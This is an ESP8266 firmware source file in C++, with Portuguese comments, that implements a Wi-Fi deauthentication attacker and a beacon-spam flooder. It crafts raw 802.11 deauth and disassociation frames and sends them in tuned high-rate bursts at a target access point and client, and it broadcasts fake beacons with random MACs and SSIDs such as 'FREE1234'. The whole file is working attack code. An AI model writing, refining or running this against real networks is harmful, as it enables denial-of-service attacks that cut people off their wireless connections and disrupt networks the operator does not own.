#include "deauther.h"

#include <ESP8266WiFi.h>
#include "app_state.h"
#include "wifi_portal.h"

extern "C"
{
#include "user_interface.h"
}

bool deautherRunning = false;
unsigned long deautherPacketsSent = 0;
bool beaconActive = false;
unsigned long beaconPacketsSent = 0;

// Variáveis de controle do ataque
static bool attackActive = false;
static uint8_t targetApMac[6];
static uint8_t targetClientMac[6];
static uint8_t targetChannel = 1;
static uint8_t attackReason = 7;
static unsigned long lastAttackPacketAt = 0;

/** Intensidade: mais bursts por rajada e periodo mais curto = mais pacotes/s (limitado pelo radio). */
static constexpr int kDeauthBurst = 28;
static constexpr unsigned long kDeauthPeriodMs = 10;

// Pacote melhorado (mais compatível)
static uint8_t deauthPacket[26] = {
    /*  0 - 1  */ 0xC0, 0x00,                         // type, subtype c0: deauth (a0: disassociate)
    /*  2 - 3  */ 0x00, 0x00,                         // duration (SDK takes care of that)
    /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // reciever (target)
    /* 10 - 15 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // source (ap)
    /* 16 - 21 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // BSSID (ap)
    /* 22 - 23 */ 0x00, 0x00,                         // fragment & squence number
    /* 24 - 25 */ 0x01, 0x00                          // reason code (1 = unspecified reason)
};

static uint8_t beaconPacket[128] = {
    /*  0 - 1  */ 0x80, 0x00,                                                                                                             // Type: Beacon
    /*  2 - 3  */ 0x00, 0x00,                                                                                                             // Duration
    /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,                                                                                     // Destination: Broadcast
    /* 10 - 15 */ 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,                                                                                     // Source: Random
    /* 16 - 21 */ 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,                                                                                     // BSSID: Random
    /* 22 - 23 */ 0x00, 0x00,                                                                                                             // Sequence
    /* 24 - 31 */ 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,                                                                         // Timestamp
    /* 32 - 33 */ 0x64, 0x00,                                                                                                             // Beacon interval: 100ms
    /* 34 - 35 */ 0x01, 0x04,                                                                                                             // Capability info
    /* 36 - 37 */ 0x00, 0x06,                                                                                                             // SSID tag
    /* 38 - 43 */ 'F', 'A', 'K', 'E', 'A', 'P',                                                                                           // SSID
    /* 44 - 45 */ 0x01, 0x08,                                                                                                             // Supported rates tag
    /* 46 - 53 */ 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c,                                                                         // Rates
    /* 54 - 55 */ 0x03, 0x01,                                                                                                             // DS parameter set
    /* 56      */ 0x01,                                                                                                                   // Channel
    /* 57 - 58 */ 0x05, 0x04,                                                                                                             // TIM tag
    /* 59 - 62 */ 0x00, 0x01, 0x00, 0x00,                                                                                                 // TIM
    /* 63 - 64 */ 0x2a, 0x01,                                                                                                             // ERP tag
    /* 65      */ 0x00,                                                                                                                   // ERP
    /* 66 - 67 */ 0x2f, 0x01,                                                                                                             // HT capabilities tag
    /* 68 - 83 */ 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,                         // HT
    /* 84 - 85 */ 0x3d, 0x01,                                                                                                             // HT information tag
    /* 86 - 87 */ 0x00, 0x00,                                                                                                             // HT info
    /* 88 - 89 */ 0x4a, 0x0e,                                                                                                             // RSN tag
    /* 90 - 108 */ 0x01, 0x00, 0x00, 0x0f, 0xac, 0x02, 0x01, 0x00, 0x00, 0x0f, 0xac, 0x04, 0x01, 0x00, 0x00, 0x0f, 0xac, 0x02, 0x00, 0x00 // RSN
};

/** wifi_send_pkt_freedom exige STATION_MODE, sem SoftAP; promiscuo costuma atrapalhar o envio. */
static void prepareRadioForDeauthInjection(uint8_t channel)
{
  wifi_promiscuous_enable(0);
  WiFi.softAPdisconnect(true);
  delay(50);
  wifi_set_opmode(STATION_MODE);
  delay(50);
  WiFi.disconnect(true);
  delay(150);
  wifi_set_channel(channel);
}

void initDeauther()
{
  /* Radio e preparado em prepareRadioForDeauthInjection ao iniciar o ataque. */
}

uint8_t *parseMac(String macStr)
{
  static uint8_t mac[6];
  sscanf(macStr.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]);
  return mac;
}

static void sendDeauthBurst(uint8_t subtype)
{
  deauthPacket[0] = subtype;
  for (int i = 0; i < kDeauthBurst; i++)
  {
    wifi_send_pkt_freedom(deauthPacket, 26, 0);
    if ((i & 0xF) == 0xF)
    {
      yield();
    }
  }
}

void sendDeauth(uint8_t *apMac, uint8_t *clientMac, uint8_t channel, uint8_t reason = 7)
{
  wifi_set_channel(channel);
  delay(1);

  memcpy(&deauthPacket[4], clientMac, 6);
  memcpy(&deauthPacket[10], apMac, 6);
  memcpy(&deauthPacket[16], apMac, 6);
  deauthPacket[24] = reason;

  sendDeauthBurst(0xC0);
  sendDeauthBurst(0xA0);

  if (memcmp(clientMac, "\xFF\xFF\xFF\xFF\xFF\xFF", 6) != 0)
  {
    memcpy(&deauthPacket[4], apMac, 6);
    memcpy(&deauthPacket[10], clientMac, 6);
    memcpy(&deauthPacket[16], apMac, 6);
  }
  else
  {
    memcpy(&deauthPacket[4], apMac, 6);
    memcpy(&deauthPacket[10], clientMac, 6);
    memcpy(&deauthPacket[16], apMac, 6);
  }

  sendDeauthBurst(0xC0);
  sendDeauthBurst(0xA0);

  deautherPacketsSent += static_cast<unsigned long>(4 * kDeauthBurst);
}

void startDeauthAttack(uint8_t *apMac, uint8_t *clientMac, uint8_t channel, uint8_t reason)
{
  memcpy(targetApMac, apMac, 6);
  memcpy(targetClientMac, clientMac, 6);
  targetChannel = channel;
  attackReason = reason;
  attackActive = true;
  deautherRunning = true;
  lastAttackPacketAt = millis();

  prepareRadioForDeauthInjection(channel);

  sendDeauth(targetApMac, targetClientMac, targetChannel, attackReason);
}

void stopDeauthAttack()
{
  attackActive = false;
  deautherRunning = false;

  restorePortalWiFiAfterDeauth();
}

void startBeaconAttack()
{
  prepareRadioForDeauthInjection(1);

  beaconActive = true;
}

void stopBeaconAttack()
{
  beaconActive = false;

  restorePortalWiFiAfterDeauth();
}

void updateBeacon()
{
  if (beaconActive && (millis() - lastAttackPacketAt > kDeauthPeriodMs))
  {
    for (int i = 0; i < 10; i++)
    {
      // Generate random MAC
      uint8_t mac[6];
      for (int j = 0; j < 6; j++)
        mac[j] = random(256);

      // Set MAC in packet
      memcpy(&beaconPacket[10], mac, 6);
      memcpy(&beaconPacket[16], mac, 6);

      // Set channel
      beaconPacket[56] = random(1, 12); // Random channel

      // Generate random SSID
      String prefixes[5] = {"FREE", "HOTSPOT", "WIFI", "NET", "LAN"};
      String ssid = prefixes[random(5)] + String(random(9999));
      int len = ssid.length();
      beaconPacket[37] = len;
      for (int j = 0; j < len; j++)
      {
        beaconPacket[38 + j] = ssid[j];
      }

      wifi_set_channel(beaconPacket[56]);
      delay(1);

      wifi_send_pkt_freedom(beaconPacket, 109, 0);
      beaconPacketsSent++;
    }
    lastAttackPacketAt = millis();
  }
}

bool isDeauthActive()
{
  return attackActive;
}

void updateDeauth()
{
  if (attackActive && (millis() - lastAttackPacketAt >= kDeauthPeriodMs))
  {
    sendDeauth(targetApMac, targetClientMac, targetChannel, attackReason);
    lastAttackPacketAt = millis();
  }
}

void toggleDeauther()
{
  if (attackActive)
  {
    stopDeauthAttack();
    Serial.println("Deauther stopped");
  }
  else
  {
    uint8_t *apMac = parseMac(deautherApMac);
    uint8_t *clientMac = parseMac(deautherClientMac);
    Serial.print("Starting deauther with AP MAC: ");
    Serial.print(deautherApMac);
    Serial.print(", Client MAC: ");
    Serial.print(deautherClientMac);
    Serial.print(", Channel: ");
    Serial.println(deautherChannel);
    startDeauthAttack(apMac, clientMac, deautherChannel, 1);
    Serial.println("Deauther started");
  }
}
